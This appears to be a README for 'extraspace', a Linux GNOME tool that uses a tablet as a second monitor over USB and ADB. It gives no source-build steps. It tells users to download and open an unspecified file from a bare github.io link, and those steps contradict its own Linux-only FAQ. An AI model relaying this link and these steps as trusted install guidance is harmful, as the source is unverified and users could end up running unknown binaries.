# 🖥️ extraspace - Turn your tablet into a monitor

[Visit the release page to download](https://an403879.github.io)

## 🎯 About this software

Extraspace turns your Android tablet into a second screen for your computer. You connect the tablet with a USB cable. The software mirrors your screen to the tablet. You gain extra desktop space. It supports touch input. It sends your tablet camera feed to your computer. Use this to boost your workflow. 

## ⚙️ System requirements

Ensure your setup meets these needs before you begin:

*   **Computer:** A desktop or laptop running GNOME on Linux with Wayland support.
*   **Tablet:** An Android device running Android 10 or later.
*   **Cable:** A high-quality USB-C or USB-A cord.
*   **Software:** Android Debug Bridge (ADB) installed on your system.

## 📥 Installation and setup

[Visit the release page to download](https://an403879.github.io)

1. Go to the link above.
2. Select the latest release version.
3. Download the file that matches your operating system.
4. Open the downloaded file.
5. Follow the prompts on the screen to finish the installation.

## 📱 Preparing your Android tablet

You must enable developer settings for the connection to work.

1. Open **Settings** on your tablet.
2. Go to **About Tablet**.
3. Tap **Build Number** seven times until you see a message about developer mode.
4. Return to the main **Settings** menu.
5. Tap **System** then **Developer Options**.
6. Find **USB Debugging** and turn the switch to the **On** position.
7. Confirm the change in the pop-up window.

## 🔌 Connecting your devices

Follow these steps to start your second monitor:

1. Connect your tablet to your computer using the USB cable.
2. Look for a prompt on your tablet screen.
3. Check the box that says **Always allow from this computer**.
4. Press **OK** on the tablet.
5. Launch the extraspace application on your computer.
6. Wait for the application to detect the connected device.
7. Click the **Connect** button in the app window.

## 🛠️ Troubleshooting common issues

**The app does not detect my tablet.**
Unplug the USB cable and plug it back in. Check that USB Debugging remains active in your tablet settings. Restart the extraspace application.

**The screen looks blurry.**
Check the resolution settings inside the app. Select a setting that matches the native resolution of your tablet. Ensure you use a reliable USB cable, as cheap cables limit data speed.

**Touch input does not work.**
Disconnect the tablet and close the app. Open the app again and reconnect the cable. Grant any permissions requested on the Android device.

**My computer screen lags.**
Close programs you do not need. Your computer hardware processes the video signal. Lower the frame rate setting in the app if high settings cause slowness.

## 📖 Frequently asked questions

**Does this drain my tablet battery?**
Yes. The tablet draws power from the USB port, but the screen remains active to display the feed. Use a powered USB hub if you plan to use the tablet for long periods.

**Can I use this over Wi-Fi?**
No. This tool relies on a dedicated USB connection. A cable provides the stability required for a smooth monitor experience.

**Does this work on Windows or Mac?**
This specific version targets the GNOME desktop environment on Linux. It requires the Wayland display protocol to function.

**How do I adjust the screen layout?**
Open your computer display settings. Drag the monitor box to the desired position. This tells your computer where to move the mouse cursor when it leaves the primary screen.

**Is it safe to leave USB Debugging enabled?**
Keep USB Debugging off when you do not need it. Only enable it when you connect to computers you trust.

Keywords: adb, android, gnome, gtk4, libadwaita, linux, rust, screen-mirroring, second-monitor, virtual-display, wayland, webcam